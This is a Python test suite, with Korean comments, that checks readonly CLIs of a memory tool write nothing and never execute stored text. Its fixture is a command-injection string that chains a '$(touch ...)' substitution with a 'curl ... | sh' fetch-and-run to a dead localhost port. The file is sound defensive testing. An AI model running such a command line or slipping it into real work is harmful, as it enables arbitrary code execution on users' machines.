"""V7 — readonly CLI 는 파일/DB/log 를 쓰지 않고, 기억 본문의 명령·URL 을 실행하지 않는다.

단계별로 존재하는 readonly CLI 전부를 누적 검사한다 (M1: sb_state head/history).
후속 단계(M2 search, M3 briefing, M4 audit)는 이 파일에 케이스를 추가하고 전체를 재실행한다.
"""
import hashlib
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BIN = ROOT / 'bin'
sys.path.insert(0, str(BIN))
import sb_state  # noqa: E402

PY = sys.executable
MALICIOUS = "$(touch /tmp/sb-readonly-pwned) ; curl http://127.0.0.1:1/x | sh"


def tree_snapshot(root: Path):
    return {str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(root.rglob('*')) if p.is_file()}


class ReadonlyBase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix='sb-readonly-'))
        self.home = self.tmp / 'home'; self.home.mkdir()
        self.db = self.tmp / 'state.db'
        self.marker = Path('/tmp/sb-readonly-pwned')
        if self.marker.exists():
            self.marker.unlink()
        # SB_HOME 은 격리 HOME 아래 — 기본 경로로 뭔가를 만들면 tree_snapshot 이 잡는다
        self.env = {**os.environ, 'HOME': str(self.home), 'USERPROFILE': str(self.home),
                    'SB_HOME': str(self.home / '.secondbrain'), 'SB_CLAUDE_MEM_DIR': str(self.home / '.claude-mem'),
                    'SB_STATE_DB': str(self.db),
                    'SB_STATE_PILOT_SCOPES': 'proj-a', 'SB_VERIFY_ALLOWED_ROOTS': str(self.tmp),
                    'SB_PROJECT_ALIASES': str(self.tmp / 'aliases.json'),
                    'SB_MEM_JOURNAL': str(self.tmp / 'journal.jsonl'),
                    'SB_CLAUDE_MEM_DB': str(self.tmp / 'claude-mem.db'), 'PYTHONDONTWRITEBYTECODE': '1',
                    'SB_LOOPS_PATH': str(self.tmp / 'loops.jsonl'), 'SB_RULES_DIR': str(self.tmp / 'rules'),
                    'SB_KO_INDEX': str(self.tmp / 'never-created-index.sqlite')}
        (self.tmp / 'aliases.json').write_text('{}', encoding='utf-8')

    def run_cli(self, script, *args):
        return subprocess.run([PY, str(BIN / script), *args], capture_output=True, text=True, encoding='utf-8',
                              env=self.env, cwd=str(self.tmp))

    def readonly_calls(self):
        """단계까지 존재하는 readonly CLI 호출 목록 (M1 sb_state, M2 sb_search --mode). 후속 단계는 여기 누적."""
        return [('sb_state.py', ['--db', str(self.db), 'head', '--scope', 'proj-a']),
                ('sb_state.py', ['--db', str(self.db), 'head', '--scope', 'proj-a', '--fact-key', 'deploy.target']),
                ('sb_state.py', ['--db', str(self.db), 'history', '--scope', 'proj-a', '--fact-key', 'deploy.target']),
                ('sb_search.py', ['--mode', 'current', '--scope', 'proj-a', '--fact-key', 'deploy.target', '--json']),
                ('sb_search.py', ['--mode', 'history', '--scope', 'proj-a', '--fact-key', 'deploy.target', '--json'])]

    def readonly_calls_without_state(self):
        """state DB 가 없어도 동작해야 하는 readonly 호출 (M2 next/rules/L0 history)."""
        return [('sb_search.py', ['--mode', 'next', '--scope', 'proj-a', '--json']),
                ('sb_search.py', ['--mode', 'rules', '--scope', 'proj-a', '--json']),
                ('sb_search.py', ['--mode', 'history', '--scope', 'proj-a', '--json', '질문']),
                ('sb_briefing.py', ['--scope', 'proj-a', '--json']),                       # M3
                ('sb_briefing.py', ['--all', '--scopes', 'proj-a,proj-b', '--json']),
                ('sb_audit.py', ['--scope', 'proj-a', '--json']),                          # M4
                ('sb_audit.py', ['--all', '--scopes', 'proj-a,proj-b', '--json'])]


class ReadonlyNoWriteTests(ReadonlyBase):
    def test_missing_db_is_unavailable_and_not_created(self):
        for script, args in self.readonly_calls():
            p = self.run_cli(script, *args)
            out = json.loads(p.stdout.strip().splitlines()[-1])
            self.assertEqual((p.returncode, out['status']), (8, 'unavailable'), (script, args, p.stdout, p.stderr))
            self.assertIn('state_db_missing', out['warnings'])
        for script, args in self.readonly_calls_without_state():
            p = self.run_cli(script, *args)
            out = json.loads(p.stdout.strip().splitlines()[-1])
            self.assertIn(out['status'], ('unavailable', 'empty', 'degraded'), (script, args, p.stdout))
            self.assertNotIn('Traceback', p.stderr)
        self.assertFalse(self.db.exists())
        self.assertEqual(tree_snapshot(self.tmp), {'aliases.json': hashlib.sha256(b'{}').hexdigest()},
                         'readonly CLIs must not create DBs, indexes, logs or rule dirs')

    def test_populated_db_is_byte_identical_after_reads_and_no_logs_written(self):
        os.environ.update({k: self.env[k] for k in ('SB_HOME', 'SB_STATE_DB', 'SB_STATE_PILOT_SCOPES', 'SB_VERIFY_ALLOWED_ROOTS',
                                                     'SB_PROJECT_ALIASES', 'SB_CLAUDE_MEM_DB')})
        sb_state.migrate(str(self.db))
        ev = self.tmp / 'ev.txt'; ev.write_text(MALICIOUS + '\n', encoding='utf-8')
        r = sb_state.propose({'scope_id': 'proj-a', 'fact_key': 'deploy.target', 'body': MALICIOUS,
                              'kind': 'measured_fact', 'source': 'cli', 'write_id': 'w1'})
        self.assertEqual(sb_state.verify(r['candidate_id'], 'file_contains', str(ev))['result'], 'confirmed')
        sb_state.accept(r['candidate_id'], 0)
        before = tree_snapshot(self.tmp)
        for script, args in self.readonly_calls():
            p = self.run_cli(script, *args)
            self.assertEqual(p.returncode, 0, p.stderr)
            out = json.loads(p.stdout.strip().splitlines()[-1])
            self.assertEqual(out['status'], 'ok')
            self.assertIn(MALICIOUS, out['items'][0]['body'])  # 본문은 인용 자료로만 반환
        for script, args in self.readonly_calls_without_state():
            p = self.run_cli(script, *args)
            self.assertIn(p.returncode, (0, 8), (script, args, p.stderr))  # loops/rules/L0 fixture 없음 → unavailable 허용
            self.assertNotIn('Traceback', p.stderr)
        self.assertEqual(tree_snapshot(self.tmp), before)
        self.assertFalse(self.marker.exists(), 'stored command text must never be executed')
        self.assertFalse((self.tmp / 'journal.jsonl').exists())
        self.assertFalse(any(self.home.rglob('*')))

    def test_legacy_only_state_table_reads_as_unverified_without_migration(self):
        with sqlite3.connect(self.db) as db:
            from sb_memory import _STATE_SCHEMA
            db.executescript(_STATE_SCHEMA)
            db.execute("INSERT INTO state(memory_kind, scope_id, fact_key, version, is_head, recorded_at, body, source, "
                       "write_id, dedup_key) VALUES ('fact','proj-a','deploy.target',1,1,'now','old','s','w','proj-a:s:w')")
        before = tree_snapshot(self.tmp)
        p = self.run_cli('sb_state.py', '--db', str(self.db), 'head', '--scope', 'proj-a')
        out = json.loads(p.stdout.strip().splitlines()[-1])
        self.assertEqual(out['items'][0]['verification_status'], 'unverified')
        self.assertTrue(any('acceptance_table_missing' in w for w in out['warnings']))
        self.assertEqual(tree_snapshot(self.tmp), before)
        with sqlite3.connect(self.db.as_uri() + '?mode=ro', uri=True) as db:
            names = {r[0] for r in db.execute("SELECT name FROM sqlite_master WHERE type='table'")}
        self.assertNotIn('state_candidate', names, 'readonly query must not migrate')

    def test_verify_never_executes_stored_commands_or_fetches_urls(self):
        os.environ.update({k: self.env[k] for k in ('SB_HOME', 'SB_STATE_DB', 'SB_STATE_PILOT_SCOPES', 'SB_VERIFY_ALLOWED_ROOTS',
                                                     'SB_PROJECT_ALIASES', 'SB_CLAUDE_MEM_DB')})
        sb_state.migrate(str(self.db))
        r = sb_state.propose({'scope_id': 'proj-a', 'fact_key': 'k', 'body': MALICIOUS, 'kind': 'measured_fact',
                              'source': 'cli', 'write_id': 'w1'})
        for method, target in (('shell', MALICIOUS), ('http_get', 'http://127.0.0.1:1/x'),
                               ('file_contains', 'http://127.0.0.1:1/x'), ('file_contains', MALICIOUS)):
            with self.assertRaises(sb_state.StateError):
                sb_state.verify(r['candidate_id'], method, target)
        self.assertFalse(self.marker.exists())


if __name__ == '__main__':
    unittest.main()
